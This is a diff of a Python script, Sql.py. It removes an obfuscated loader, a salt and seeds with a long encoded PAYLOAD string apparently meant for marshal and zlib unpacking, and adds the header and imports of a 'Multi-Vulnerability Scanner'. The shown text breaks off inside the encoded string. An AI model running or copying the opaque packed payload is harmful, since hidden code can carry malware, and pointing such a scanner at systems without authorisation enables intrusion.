@@ -1,807 +1,3317 @@
 #!/usr/bin/env python3
-from __future__ import annotations
+# -*- coding: utf-8 -*-
+# Al-Shammari - Multi-Vulnerability Scanner
+# Cross-Platform: Linux/Windows/macOS/Termux
 
-import base64
-import hashlib
-import marshal
-import sys
-import zlib
+import sys, os, re, time, random, urllib.request, urllib.parse, urllib.error, argparse, ssl, platform, hashlib, base64
+from urllib.parse import urlparse, parse_qs
 
+# Cross-platform compatibility
+PY3 = sys.version_info[0] >= 3
+IS_WIN = platform.system() == "Windows"
+IS_LINUX = platform.system() == "Linux"
+IS_MAC = platform.system() == "Darwin"
+IS_TERMUX = "ANDROID_ROOT" in os.environ or "TERMUX_VERSION" in os.environ
+IS_KALI = os.path.exists("/etc/kali-release") if IS_LINUX else False
+IS_ARCH = os.path.exists("/etc/arch-release") if IS_LINUX else False
 
-EXPECTED_MAJOR = 3
-EXPECTED_MINOR = 14
-ENTRY_NAME = 'Sql.py'
-SALT_HEX = '17bd84ae6a6ff275f3545a292ed76fb5'
-SEED_PARTS = ('bec1de077ab44bef', '691d2432e0bc0451', 'b1ac98fd87fef32d')
-PAYLOAD = (
-    "9y`T%zW!d_l2v&EbuOcLr(wQ83l0KPyUd%UX^C{EGRzm2Jk2@22hlvAM-"
-    "T|?F={k{g{oc`vi*&$W)0t{U4ZOOoie@0%GB7BSRw}0Op!SaJc3ox^{m9*r!KA-"
-    "J9oC(yU0`b3bU7PFK3*W+&s+m<BW9xLo+)BXm^qpDKoXf!Bll#Fu@_mgih4btX^fV`)COEXX;{t*u^lBliRCC{AO2Z9eQIc6oM(c"
-    "19tK2cdW2V4;cwOZUx~6Fyw<5O`{xC>RG`{xH>y9M$b8GL#*@}6p-"
-    "lE&xLvod2Cu^l?Xi9t=n^Pz(s!Do@n$fNZq5d`UYU<eO0Bc)^nKRJYtF&mC0d*=Yl{ElLigENlb}u$@Ne%*$ZXiSetK|GT(3x8n1"
-    "MNPk~go2$A+eJd(VGsRy@W6YLXb3^fQD0s<hiOMd5l-"
-    "}3J>4Gk9_8q_Ew#ti|Y8997NAXqYUoT=_+Yne}RsGz;CQMr!ILK?5`@T=P0phpTBA)GNfU78e>^Y7j$M*wrh#8<N;W2yeF%ZW+V8"
-    "$5PdZzF#D$oCok10*s_myhQ4ztH8~lI{+U5#6X5@1VVAq?74>XhlPs={V!hfeY1mipMiRMAsy%n1*EMaCxE-"
-    "g;v%hPL4tx7K*g<@1nMqCTW=f4==$`E7)xztO`E2MeS`>&!Ib3Vch2r1%LfN!2wO<p{ipcBeyxIbLMI3oC14p)b@x8Qm-Gv1@B^r"
-    "q)D`%1X&fond)1B+T)ca4cuN@u~{!KQ400XZrJBc0b|k^0uif-"
-    ";DRROc$wjQIt0<4%vL)T87{OqJeS65#zqFJW<(!fNrT!y+=0vnJT`X3#=}w!a)Cop`7#yElu~MxD)L{%0Miy|PkT5pYDPzAgX;WU"
-    "d%}0Ih@tWt_<auk4c+u|OAl7sN&BUIg@ui~q<N(ORi!5=@Q9%tOYfK;ZeE@Lw`b@&-"
-    "(tKn0Pa5jD|WTj!RLnzk6zG5LD7BQLPgR{{yCPk1<^1;WLJDg$RGB3kw6{F=(a%GhysH3wUP*s?Th810`I0|8uRyEh@}3r>2B7JP"
-    "8gH<q0&7->(<YXJ&70kurKHHIz^h_9=wZx@*oP#Y04;-X*xl-"
-    "^rz&Qco@6EJ=k^$tMYzvIzAAQ=%FE4LIVClUnU2|aR)o(jsK3GYDDE!5tE7JdjPG1@%uc?a`J04_o?~CNo3%bnke0nO&ct}>03J>"
-    "*eUE;a}ZgO<mazI-ZTdaBR)8mDvf$uaU{<&{SivCUWVM9iB61dHXLP)(6{JT{HksR*=zpXGa(|N_5x&%yqKcWVM*DDgjV5;`OGpA"
-    "w@8y9g5ayV?fyFMboTrefBzhp^fG-ksfO0<BB+O7ZL!K!z}(JeCmLS4oXom(1E@Ik)j)YxrS>TU6UcuqJhOTDv~37aDGX#nKHpfP"
-    "3P#{`Sklh8B=2w>ZO%(DAah;(t7uhn+h=Xyac>|Iq^VISDOdcC8e<Mhi8-a-"
-    "p>k+?70;iv`0Z_!X_#PZRG3vx_c+@xT}pI*!Zs!zBh45cfkk_``1KgZz>C8rGfuKtj%N9zKrn!qYWdu4YL_2m@OQAftj<vN$>Fu{"
-    "_}b|^W4)yoFz%w`4>5%t3a>i7`Y*__g+p<Oh*G?}2#L}u*V$@5Ms<-"
-    "(X?^#~>J^$1BUdcJpk}+oQzpWk(Bmqo*K!U{pUB>VnqjOw&*zM6TGp>^CDdiJVk%=>H;73HWFR@i5DPeSf1vHc{-"
-    "Rn=MxVt&cW7YRm$#RPUGYUx(OR|s(d7ak4Y)SAc)1fYsLuq_{N@<$jHyNgQIdF21ykd&n7aw&?W%_?DKe|bntta><rp)Wz$4CX(K"
-    "Q#`Sp-s|V74UPS~$3J8(@6izi^2%#*|S+kMd1?{(eka?3&GK>K{LkR&WP$M+ng^jjwf9tR|dZP2w6X%^-"
-    "xEXX;kNwD~3)F72O00@>1hkH9d^bIvIYPK8Nnh7?)s{w`TduV@c_)ItZDeKcj+(O3`R3xTjxb_{70URh7zhsUioSL!xWHPuv*aX;"
-    "tI57cuX<zaKT?fa||17pr1mv`OS?o*lJ%}-"
-    "TdXIG+_?E#55upsyMy7GH9(f4ZUm&RF#*=aF^Ys+=9Ed>4TjGMtIHTs$ETYh=HN{>{$Op+rLdcLvKpur`djZp1%Z{=4Gtt2>gx6a"
-    "}`fzYj5jqR)m-"
-    "NhVbb|;t~a>bHu!0}q9ZmvC0O%o?=t9Wa;9#AhV`!+n9$L?X&J(DH7w1+|6^7gvSwXvaoslEO=6WEsJB2+J6kR=GUp8#n(Bm*cld"
-    "57$35Sf}5s4Cip`<jD~`w%-;E2*#j%z2m4(u_H{8Yd?ugnc%D*f*IK0|LXC2h28B{p0gX*oKK!{b;-"
-    "<=pbi^A9E5I!iyHy2W=FiL>94^TtNJk?PRmmqC_6vd_8rvo|ioqeRkFxwrr>#R<2iM&N~-"
-    "G>uWu@1*^>Pi3>{BOdgZm(9{+WPo}iwIXemk!aW!`m^Sx_efoJ2E3BymK-bO**@NG>Q4*J`JXgmOGT2qvt5tiCh+u5HMk0-"
-    "z**qV2Hp^^cw`mTUtl7Af@E;|G=P>$Kk4o#SK%EE7@TCeAh}PGo>d865o_#FQ>H~uzP61hIU;VD4GyV~eF=ofG!v+NEa720@A+sv"
-    "&r18ICN}=b%jOASE^E-Wt2H>9yVrppAn~U2K8D)BwLW1uWYSR(Wf-$K2>hG4fv9-"
-    "k*q2RHt1<pPXUvqx%+u3OhY86ZFa$9yt8daQ3$a~a&Sq-cKDAxzN7Lt|?3Ty7t5uVW`gt?sfcXDcvtYiV3#nZWCwQud!Bm5j;s`w"
-    "cnbaa^dSr)mwch{Fz8Bp6f*e(?6O1~$%G>aD*YxWMOgZ|rVVZ@>hje934X0VjH<FIS90i#u8dzeR`Bo7iY5h^S8$m66zIBMD-lB<"
-    "?Aa(|S+x-Pjlc5!nnY)D={Rh*2IKJ|et_eVWM8bj(?N=nnFV*_-8<-w?|LV+0Ot6&ba`48lpvVr;-"
-    "HU>NXRb>9>o^!B0|FY{`B+B#F+wuqX$_m)1&fq4`Lr5Tp!#d<R#`D(&f(D`8IS-"
-    "A^hB{K@0VKq$>j21vy6&G^t@B1GYV<Jbh3CsNpC_bE%>Vtl;ou=C7@)!y3%xzw(kTd`hx(#soILF<bfA9(xkp~CbeLDVTl)KG@lH"
-    "U@*0o!QN#;TF_Z_CYwt??11oEM{;>_bH+qb9FEV9`>F$11_-"
-    "+95^^n(EUIMdLtEu>12CY`mzuD5D=Evb>7&(mui`zEN=B#BAlf`J)e#{^n+(!(F{PiSxF>=5co>aqNz&RMzwB^PcOInU#whhFL*)"
-    "v+$Sog8+Fp>kDC25@X5#rlJQzeo@v2Uam|_0UOaad7wlt2XGXW8+KYbIq@@TIiADuyOX4v{;XuX*EL6(Gqr0J`%nFRC#^eJ<W`gn"
-    ";mWeBcV1XYqDLG1&<a(BE>JV2+)zb)lNG?nvtAOZ<elRo|Hy7tfk2HR{+!p&(wkq7HjF^0AN4Eu;BhiOF6yEZsakQ*|1m}ceMqD-"
-    "A&Nl18{T-"
-    "#Z@Nfy})Eq`M>U12cF<~w#y{$<R3uAaN~|1hwwx5`Q?@nhZ1xXEoBVr57l${i@kR!+7D|BiMyR`KhsW?AYHEUbyOOk%@&jN1Z*Qe"
-    "zI=-"
-    "#ad*46@=i=LSB>!;3j3<bouG>;EyL*iliL!acE34zPHceKBgx_QNsXX7*z(O4NZS+5$>trWD2iB|I0L0oR8=o+nvNIF`f;s~M1)Z"
-    "C(n}RXfy^;J`@k7mWSSHBPxC;nZjMx{cH#rDWdAj(InwNjwf>Gu_J#{q-"
-    "w*r<CWv@%Wane6w{q9r@4=F+AWH&bi3kTxJ9Is=GTV7Q-"
-    "RT7|aUIipb0+veLu?v6ES7pO30+Y0Z$$NPq;o5n+i+0OakCqK1r}zb!nk@}EP#OUwmH^~7G9xxbw5|$&fc43Cz#&!|Dq0CpsdIJI"
-    "3bqRCrSOEZxR4Pm{xCxWrDLL4v#_|4|5)fI`0^xw$1xg)XjqnvnicXWQnXaeWXsZ(uY|9rDjtNOuc&idfduUFfAbJ=|eoB(veJL="
-    "^tlkle<rEBtMt;Qp(uUsvbw5noKYe$nK|&z+R+jL20B#U7&T=?iI?l7;T`68m8{ol_3TZ`uyB0&=RwM!d@}Ri_Pd58>x1seBKspl"
-    "GIpSW=4+?Er%;dI{63xt(?>7lHAAySXMNCRIYnFoEPoThZ@qP)5e!23iLIg*L(UzuyT|mcTWeL`yfM8j_|u<;N?}1mkMCHC!zC16"
-    "1&yX{Im7hx@Q7@xgLC5*pVz9^skG@@1yN~z-xYBQc4mU>gEx4G_{<<>{f9-"
-    "pzv*RyOSOj5pKy~upF37Pn>PrN&E=DEA5QGxH%Jwve^hVRzjb(CmtDLjtekYGL7<?5$#|ud=&Y;;+ij0JkF`8g@{4+pN9Y~kERvv"
-    "hv&{^LKYPu_6-"
-    "@Z%oZDU;BXilpb((`Vy>iuAQ<W77o_0r^hRD2mH{k@^7w6(;t#$K`s`ZX5)|n^P#f1Vm7&+R`T7Z#kAH*d2U3}g-7ELe1LVX-"
-    "*meVXM1Gv9QEJ+U{>v{P?`RDKS~?Jy(_Vsq&)sctsw_gn_oT}v-(LldO1pTo>*1UIi`<RP$Y&bydx>mwYKN6pyxXIH-"
-    "z3ho5%zWA1Tl7l^+A@#MwfRZ6<JUfh|t#3wO`OEu;_&_70Lq8hID+4G=l#Ov+_-"
-    "n<r$%1)&siPPt5!v{phEx9)|(r!s^svZmK=o8YJ0&dA>|^#YTwKEI4s>z1}h}#1|I9wmkDB)ED`ngNL62ig<PE$5%D)=A)ffc^k*"
-    "f>z+dZwCHrW1}^uGt)RqFf^3KDBnO4_l{)1UZ$*AZCCLEAzo0cg;WBvB<KX{-VquO7*l-"
-    "|;w$v@NB09l|*v9V(sL8}r1N{o`o3K!aMHOZJ)zt)s9|~@q@xT_rFc7jdTEdYB|F=;NwObt3KvXjYSV}KJ=3x}OBS_uocf<FsGfz"
-    "T-tsdB2Fd<O_zE8e=kvSMJzkXE&k7>DpK+v!g4=)7qutS6uCtI99T}pjqfW*J?kFZdAjo`O24FX!~wbeqm1T?;HRj`$FsrsMWT&R"
-    "Ci;UQ4`#s+Ho!QL!VH_p8#{kSPguJ}J{*cBJ7RxQ1Oy#Hu_Bso}3q+gs@<0!9B=GwJTwIL1mC;lF<t)8r-"
-    "!g@5m+zoA!N>(5{CSe${wX;$QJAa{`lO3fkd$|BEY1c3->Q?-"
-    "nVsF&nps71MLPEdTXwV)<g+_X@;wZBADX|R1pJD!RREjGGV#~kK`!shHKxSUp|JT}v(30KYKZsFv%^7tzM0M$O6eanX1JxGqIm&Y"
-    "=`HXsZ&D^p2%4Bgv*XPE`$cR~qm=+bc6U12gIu{e?z+{sKC4mM{6Qu%eAkC*4vD<BmP{j8oOH{62&Oio<zMDzfjX0E%K&pc?WOwS"
-    "F)m;`pT%>{)u!_-"
-    "B&HQrrLP2t*21`CxzY$ZGnY5~ZnM9Ne%B|?1(4_Q$)aRE~Nmo%gc=1!$kU_)2bQL%A{tDos7$uIU!xWIx!Vi#@2m1)>TT64~=<s5"
-    "=HXE)MnLYf^P>2`BZNjb@2bEBv>+(-"
-    "F8Yhpf8;U+8Mcinab@+p02<IX^nXkm~c02q}b@wEt8fL9>VG>H(y#YpDsx~PX#&E`(<s#&Vq0e{`fe2sjP227)=;_M(W~j%?5ZC~"
-    "5Lo)7t0{vOI3X@Ju-"
-    "e<Ru17xqcCQkvUH#J4=4E(ui7o00Eg(uFpqZp>BH7KOR)?|x94ejw7fS&i5(b;>&Ib?vK_ga`UH|@tL@exY5@%sy>2h(KPbXT3eU"
-    ";12Vmh%oGp^}Q}OK>$R8+?QEly@1cIe?#qSc^tU{Sz)Id{oyWp<a8bbDK~a9`My1%NXd>0qlB1d6FuJsx}Uug`-"
-    "U#P0DA)sGN>Jd=q&8grp9$1fRF5iyCy!n8N797Gf6!<4jiFmIEO14L}+%N+-"
-    ">i;}je$OQFS)<Y|zH=Q!lPfPL<9(K#BLn5tpz@+lW6&LsV1jAvGn_udJ$8V`Xa^RniyP^@F&zh+x0)q&_dv42bI$U7cXWn3arr$s"
-    "S#)?F@yjn#HErDC>m3IZDom$o;Q-SZ-XajAd?m+I{XhfI(-"
-    "N4<s3n<V<u8K3rBNvOz`FOoRPTyD~z$Jp#xZ(2E2rczc#5HlX!7tP|y?Um}l#eBO2_T{D5gaz-"
-    "S8=8QKqF?+MT(t0#`!RP{RZd(6il|P=)1Zr8*LQ@%(8zZ0*s1TMOJr>BbUk>8`VdwznkbgJvCeg`3$0z`FBPwWqfqtkMhB)MAf<g"
-    "+Zm?kcVzv}%8n@rHDLXh428p~Soov$rkZ?B(#BDRAo+jw(m`FE%2bnWtxj5enk_eYM_}UW3H&P-"
-    "xLppV2i}dWRCYuUw^Z$lFw8*>Ozu)K=v&<PiOj7{D4S-B{KkV{*sWl-"
-    "8X$MJK*|cC4IlZzDrXPQP`n(a~DH@(rCb}D2H+X5DT}T?SKv$nmRKy7-13}5H@m{nji-"
-    "2Sw$kzesixNw9i4!pq)c%W`eSQeMHAX1Y0I|vVCQ*A$+=!mQQPKOWKR@SVw%Z=LQzJqZ;U|8M?8V_Of@Hk`cH&x)2<huk6R^|HD!"
-    "96^HRx%&=_us%qsH_+XVbyYY0&fd!TuAM-ilPJ@n-"
-    "XOy|L0aF#2|qVUTWwO^~vb_EbJ|P*M&QJ@_4epT1Mo6TzE8=_QVIlff8FkyNC};`0cC!mT{1?Tedy4Pq4;HJ%cioce7x1HaV|x4@"
-    "Uz{3*LO@Fs29Z`Yz~FFOvjJRUQ)S2%!A<eYuXl7&!ab+R~RTxd!QsxrgRQ?l}r?74dB>0?XVo@k&soBeMIFH5cPwbL(;YQ8$c4_+"
-    "Cdd?RUl<x1~%RWisI;U%TFT+>2RJmS%(GcsgK-PR*Z@TgoCmlIx<mPH|4SqzG9A^;ryqt`^!lHUQXW0GHH;jyRF#oMEcBLT};^$n"
-    "y?Ar=^_s+9~&9r5GRX}P3-Lph3|7#ra|e9CK?Z}B!yDbNv~IducL$qDBdP~w-@iKtC@W*@|e6-"
-    "uEsc`NiX>K*V*k@a%A@ixAWOe(f+uh|dPb5%9y;^r-"
-    "_xQkrHPX{|MjLWbAy>QH2uTtoN+H50dewSs8D|V{Jn1&7RD6zyxA5tzSTo)#&RAPXZ_qIAZl8D?sG4HV!7;RO96e{6`Z_q}0fdP3"
-    "0oGfOQQ5?T%Kax*jnr$$Ib$X%tvMbF-"
-    "i8X>CY97>y$w|N=r+A7SDruY3pK^<Hk3o{xVanVpqPnYJhzJU_(=lR`q#LkHsfhvbfsHz;M))6UV-NgK>a#UABM^|H&;c98Q{0kg"
-    "8L1H%?6Uq|$%(^J&>v{V;Tz@w%*|*m0Z9GuzpQ#r6`}cqhzTkQ-3x_WGM2P=qOiZ&o1r-"
-    "j=Lp|CtQBddg*bZ8Xz852o+%el6AS;fjSN(}LhlRR0~L|Qm?$V9n^nUO(S2*Iaq#^e2&<JO(`drLIs~gIYjh$E=e7MYjxgFiActA"
-    "|Nu~z!bGGBUg=01aSIt5bG8i!ntRnmHS!n5r35?^WjQ}xe51EVf_W$l)>34Cc%9@<B`DrmBP1|R`lQ(()YUk7w8T|uyhd(e))DiL"
-    "a{HNYS%;pmpsh<H#4r-"
-    "VhwAue4cN;}7*h}#g`!$lfg4(>AXl0!?(LQ1(mN@Fy`cYID7IhA}K&O12nL?X4hsB(i=9n4}8fSSH59k}lVTasEkB)00_hdQwxo@"
-    "^XI;34#$fPb{>u=M)6O5=fkSJU=<OjcYsP{&Zcg#rgD#o5!BZ&yHxVMCYHo<DxFDB#l>k6!q<K;c|2`lVWw{-"
-    "sH&1q!2IEjgwx?sdFKIJkI#&E|rq=C`g{Uv@>a!IOj`aLl7O^#IyTMquhsEo#k=?qIaw<&bC*XIVIm3#K%g`1<)Tu)z`wI{T1&^_"
-    "^qc+lGs``?~#*YiZZ3Eg9{RI+ZGijws75+2&l8t7ib#Af>d1hfsfxo?+mpx>R9QH(YuEs$AOPj>A`z;i(?=;lw~0KcNp352C*+m6"
-    "+SM|^j;samCo?PAtz83!CAZ(?FxHQauu?55sWi4Xd6G{jj3tR3=Ssn_zg&5L^DO`|Q~T1nK~=OtI#R`;7d^4JzZPkvcN3O~Uca-Z"
-    "YhQC!umk^lez;x2`NDe_VY2;Pv&-qv)Y*s)B*>>@HS=&2M0QB%Qt%47b)TfvDdfDH9MqUy!=f$BYrLkw|-c!4azclwgMAeqE-"
-    "4jR%qaR)j3`|A4<4q4XS9u)t1=Y~=+^D@GP-sRE<FrPBXAB*AQyh@nBM^FSpv4Z(01|05mfItnT^V!?CeVEK|(?e6vN8#ZkH3vNE"
-    "!4WNl;`eOjO@^8rxjE!j(Mrb@HP_B@@pfU-"
-    "^t@Fi!pmRXr5u2Nu@wEKTK*r9)FZ<Z{#|KyBU;USU22mXPzq%MsyGpS8=ea0KuZTZ16=quK}|Gsi6{K*&=I;drj_WT${7Ktu0Y!k"
-    "{iPIVd5*#X2&Un2$O*OA9vk;5HpUy}re0A4W4?)|b~_V58$)%ue`4i<P*(c5uYi&ve^<Z(vo?ZAD2GJ@|3St`lTm~$+ibGxb_3y&"
-    "$H1`TERbe#YFWZEgucg;G80kD_P!Eux8|~+UU_I@=~Ec0<C}*ZcgLnsPhDIeV7SN7Dn@11ZK3^6jp;2VtaKJ9S=Sr<;X&~~JdZez"
-    "MA#{x>lF5Q4TxTZYm`vlJ|IM4v09)q%tezs`t)1V{HuPHr@dVw2qz1P<5t_KdERXoE-tXe20j~w{Uof%t6F@sAS7dOUE#tG4fMKA"
-    "A_1pq%E1#cz7w5KhqG=4%A=^dZ#)y=DHf?TVOp+>+RLk5c8fk?nQJj(A?t_!d3tLbF`FA)vo=(MIVq*{OFhS~#PJdGzc6i_a{^(r"
-    "#|w06TUxm-rTSN7$r-CQBzBg)JF$=TB9}m>nDadVgs`4p*hI!I90rn&`d!x;1uE77Fa_#|afEc5dkerId-5$03z-"
-    "!XmSyAb1rqb&Q31BW*aX-S+)9pWXFTXSb49%89nb?w`RQ^dwhyntvsj!-%)n4$V!@8AarwEvb{jU{1#MANUwwJJw1~8}R-"
-    "QReWo@+2q=A-Wf~c&}iMmhPg*QE13BD{<bABN7kqBK(G!COqeeD(PeZSR!LMmj`t{+8wOQO1LY&cU<oe-"
-    "@2+{b)d8t&CWHyHU<#WM+^p^dzq4r%lgjplp98=q;ZN#5Yx(>fGnwqCYpaqVfN3+ft=h9pibN^sLwwhi5Mp=pb^HD;is5Em~Id=)"
-    ">U;<}7EG*Kjs0-ZKteyS(Y4NU@af|@h%CSJU86t=fM#?lwK4;~;!p<|(?ORxDB(avAM?;^~-"
-    "hgkEO**?MYam{nUybW5sv46EZR!11Sq`69#!gfm`Ngb-"
-    "*+DWsR_Prb(yl3vLW;)Mp+(3Qon=%)AWAF2|1sC^uD$bFbqrcx_kM2vKA_Qq2N$E0c=0`Ci;1w(&ItT-"
-    "T(;SPK)y>HAv(dJq2AHCK$xDe)LkF>CH3x1^6cFw9ww2YLPsA0S@ej+n2sm4J@rcxaHy*4V^5KxChd>&M6nAWe(?ng)Bh%&8H*<;"
-    "=^g27F&c@Pi|6h9N^}1CsjoA<Bho<IHO!2ToaSM|(Wp46-;c`#gX3n}WVs(Kx3n+EJ9YCkC)-"
-    "Xp_ab#(I<v8vFbt^q1#pqMn2MgMk)Uz#apyxkloNNvyOg1&MrV!T>KR-"
-    "r2+FA&wEf%ucKlqS?qUZDTGQQfgM?p@Tm3&``we*a0N2cO=L8T8mD!C0^4iUF249~KwB6bG7Hkg+5PyNeqdxBBHsB+By?T~Mr8zW"
-    "6lSK`*L>0OVqrJ|PTy~3ZE1zsVAZ}KBn_W}|k-Du7M8vqU1<AsgtzuR?p>go*%gKCOTbta^v-!+VrZ8h%s);<MHgK=PE)7VMg-"
-    "D?LORzSUS?}9OMOpbU>C_+O$!82L5_J&b7EjJz#{=@@Q@44)B0s-"
-    "L|<grL(A$U&3y;R$+4{|5;M6n4g#ITlr$<mThlqVnDZp#>juZtnKb_)5Uv@S$XP=Ak0K0&2SAn>42@RJpSlb}}d;bp6rfZ8%-"
-    "vg2#G;V@O<xaR_mWO`U_aF8(--"
-    "IA`)*26Kw<qI*Y`JbmkK7y$v9yyVW8!@4LjxPPJ^%w;3?sMW<6u>yft8o;nD1W*@x<S>Jf}(wOm(eO&)C)Gez)|fuRu`vzvCB{bD"
-    "<@g=QTuy+Q6;aHn1AU+YZG$2)oWg>^IGB-EXF+n#T33r56(oCoW2Z4Yc#tmLV6;Mxhbq7ygDEdN+j|WdT7!Ul*A?1tO~x7_eEfgA"
-    "4s3i87dU_)_)YSJj#{aAFDQ#-P(}H1VACYKWusq)u(BE<e(<LxyS9`mG-zVU!bdCw=!EAovcQD^P=B1F}CoRDUpA&CH%onm-"
-    "LoUc#6r7aft*eUqAr&;YIOXUO}6kuCK;W3j5iK8c($br6sy~`c<%JA0Inkfu#WT5K!NAs66Somx-xJ>ua6@$wW9cv;3M1H5c!#%S"
-    "g7@3AyUtJD37_pX5Z+<0mplt8*TUp}O&R(Q55)q`6onjTTm_s9LRL&10O$OG%2bx15F!n{eWqk%j2Q)oJ!s-"
-    "Tg3&1=%^4mDTr|MO6PB{PLm#5h2Oe1&bJpfy<vx<N7a{v#MOEYQEFq80*{-MpiVWTgv2l?W}M)Hif!MvQlW5mSqY-"
-    "0iqw%tD?aRk<s^Ri5B#V!%`2jCuq$7I&JClXzP=>K`iW<Y$v)hes56bDm^F3l1Q`iaF_W58!_S<RtQm|cPpF%39z|uJ`VP)53&3T"
-    "^}P-"
-    "<PG%_8r@}Q6&SXN};iY9vpl>5MQYi3Np=7I45s{30*Fl%8>s)%iP(^qSrGZxAd!^MY$$OBl3g%CdJ)YrFbY@h|&IWfR3MeI^j+2Y"
-    "(<c5O3jn``-"
-    "(gH$@&N)M@DyY1qtsn`BIrgz)>G6N(N}i%n_hqG4yWLRcX9@&S3=Er#VhgMP@~8S+Rx=Sd_uh)u#Sq*OJQYK2etEo5$-"
-    "^3*l>e<~JcsS!rDOE{ff`Co)ujPLoHiP3vxEH)w;mc;UN!lqo8WRkBuB1DpZ=~+EzOA6Fd?^~Q@)P(A4vu@{ua3`>pEUoO9wp}Tm"
-    "r3|^-"
-    "`GWb|JMb%98`RUMOnkMQ!Zv;Z4o{f&os}jH^o!qIA~&yJFp`R>ASuLuuC4VkF9y325}{<k5L7HjV=C<qj<$7nCFy624DNi~#-"
-    "$aPgSfv{AR9*P=8jPyIPlG4j{mw|}y6f!lne6rc^M+VMOSm+BsVc%9)r@l%hB^k?QERRe~bSc91(dGvMjE;LuD!|_>70?g~4#`dS"
-    "?)zl4AuVj&<@|sC|RECqjGBxwqTmv?BMTlHs&m-mTZbgV9t*Vzyf{bvc7+F!vrrf!Q4PNVQVBxh!KXv|WS=K{+;*0e%-"
-    "!!m$CMe6VDG_%2EgQa@a&J@vk};;=$$u|{y<nCxQKsvn>w!D$s*0ZRClFzTiRXsTNLURBNU^NP({qcr$&QW)p$YivLa?DDESxi;|"
-    "4<`)gTzj&_<QBg(Ci-OQ$4ou!G-"
-    "2gdS}GUuEYFROr0aSLA`vXylfIb+K2Ba*P)eExrlzfYStppWGO}2t)4%mgh2{QQc7V%)LwV>{X8QpPcjhfxsK|+>1s1u{BI1Ks4K"
-    "{Jt9^FZ$CPElw<tJ?4^?;V^^635Qw_ys=3^Wbs4ueqr0@xncsJIq4c?G+&v9E`Hn&B0UI7D6%a&(3s!A(yOUgho3Z9Zr;d9d|-"
-    "ZD<WCmxdp50lPDKy_`@dH|De`E3|z(W5m1+dEVp0H+RMz6~hHP4}}&3}jb}k|IvEyG;(nx`J^@fmZ>DipO<F3`lmX(i_l^)m3F6s"
-    "1!Q#RUfb1n!V*GSBy?!1TTrP9bC@G?wh887p<%jyt~r?k%!MVfGDiBbF=e7Xb@jW#>m8>JVn`TVXEF08RB{9g~!W9A#;?5cEAWT+"
-    "g=N~UxGuhM7R>A)Xd7PIXHe4-*RhKald&;$#M?($DC`J7hTW%mM(GH=0CG*afJ7o_g5e(?6o9^=c-"
-    "hs`6rMTtgs^xJ$^t7lycW4yhd+XNM`v6eAu*yDybnhD|vp_$RMPMolcgPrc>%JzTU{}@fz}FSNI%^w|2SDf&^#j3hJL=CkqA=byw"
-    "|4J!*!9Jyt#_@k<|CpJSZ91J&6Wh1_y*Ow>YRq-tx&1a^0k_&WkuX6T1^TY$&!IZI^u>}V&tn$Z%W*3JpK_yZgCt-"
-    "u=u0x<K0W0cyb%7)0MFRpC6TVIYEzgeMINCva*PfWNQAaIMrmyIp9`6av<))8WR$e&kuaIcPdW~0Kr{qUPw(|kB{-"
-    "~n|+?!lCJu)rfJJL@tFqxN6(Q!m(yS1Y_z=AQ>%*uQX3h6MP~bwFQFh6<pkTQML-"
-    "2iTg8{PD|Z*<$*rfX@{07I*S2Ii<WZ#I^Q+peJFZ=ZlF8U#d`T9r2(}X`ymvMj2c}F?fAcW9LHcEiw_BS%itjHplIq<$#$3XQg5W"
-    "n0`U@<N;`(Rb-g9U0aV5*Z<wjBR(GkBznSY2q|$hW-"
-    "&V&m64eaZ9wX~$lNNwq_ie@MQ$_c+3!P+zn=b7PZ}3FG5%gY$0Oc5&((>4$O@{fFTQt??ev{qcP;qwl^dA17=_U!KAeI8<WX4*I%"
-    "dl{t~@g};G$L~M1D`@ObY=sL8fCFy~FMqA3icm-"
-    "{LkQ5~197>^?Y@Po&DCxapvD?n_98r%6p@NTrUmMf5olxU4GESb{b5NB#;B)B)X6AsB4jd_=g}5n+|m)<p4_q=hiMvbT%b!*SD~t"
-    "-;8eveFAy>~+HX>=VU|x4qa-qn3)tnT9*L4b4NN(+u5Wkm@Oan;sl%zVsAuZV*O11#7PFnUkW^aO5pWTp<q2_DP|(2VWVF6`lY@S"
-    "6ZN>@_Z5X3sB3DZ96uI`Dcy~@2_^_c%R&YQlL5R2_QqY2d>!QOD^VX<K~%)gRGwGKH=P5Tt~RU-"
-    "6sv0P)3XHgm#!_6^$FC7@7j3847k5p9@S7?MelK<MCtmhnL;Q&3(297Qex8wf(fvl(BP?5Jov+#oPA<EO<q3qUT@uzgb>yYbNOp#"
-    "|<eaL2W&E?%GwcfZ<iMS=KwRYaJ*(&1^@cKr*&wEZjkOr1)EmM@0)jOsWTtyY48+63L1l)fQO7JJ~;hOM$U!ysbv<VhnBWIL9PRw"
-    "k`j$Ef6u7c4=h~0y2+?HNbH-ugv6w(;%*gZL2vP)Ug9SI#*IXHr8&9B{rMW_$s}*0Snv>8y)-"
-    ">&qMj7c1VB#tAr=8kcwB}!<lf@&(P=9f4_j2h;`d-qnc@$r>y#+d5q`&1tD(F9u=8ON1v(-"
-    "_B_t{5Cil7+{z67%%k4seZ3pqVsY)pkzAm5tC?3hGxK*@JEcj+PReeGZ|Pj+V5<7%wpT*xfIcW|Rfx{+Q7^U?tbsfKSM*-"
-    "@_HCrmfNezt4=-Rd%r#13{bgR|T<-%MlhSE_B+dz72MhH;E2+b3J4fZjWpgZD5+nYyJi|}Qfb>R}N-*f<NVl0(Pj0KY(WVI-"
-    "Vn|NZ?fGX17y~_Of<2h+sP-D#XbPSaTWy$xD96kFcu1?KhR<@JyGW!(Lj(}*mLY-vj|r0{=#st;X^ZKg>gAZfb9MN7E(v^yejn2I"
-    "?NQj;p_kM%>hXceoD2Wl)jJUvyqE_gP8pKNd9Xe1uObDN?c;m0LAy;vRxi^ecTW)~!=a@5H|S{ZCZbo2bTD78-"
-    "?JX5vP{XuwZ*=s9Z06w!YjK?6|&DPb`<zje{|#aWjG`L_Nwbs(in-!9T7!2{)&g6l-9-*r_n8J)hi@{+bs<-"
-    "msb?&8buN0eRxMcqAVAdT@tpA5E`40`;rn`$S`=70Q;NgZ}Xpg?+Hwp`Fa{se)97#uKrwds+V$pZC4wx8-"
-    "97equV^uN2#YRMLLGJc)8%(8zTV*C)BJa;hmH|16`b`eiI6dIyqEhOz5r1tqX_BnSH@>5i{n*64DNnkm73G{zqJ3_jVG)<>ssKIg"
-    "Un%P*GVFV-+qv<eW<Ord6kMh#@XnO=E+GJ5F!W;+kUUg!`x|iUp|w5L@&a<s5<0OyEmlYNKyne9K2q|6~+#!j-"
-    "wu+9)X(z9vIms~t4Zsy4{Chy!zhYK&+h4$`UwB!BlL6Q=bHAgvcJ-1HKb37Q^A<|3nik&~apE2%<dmNHPIUxN6-"
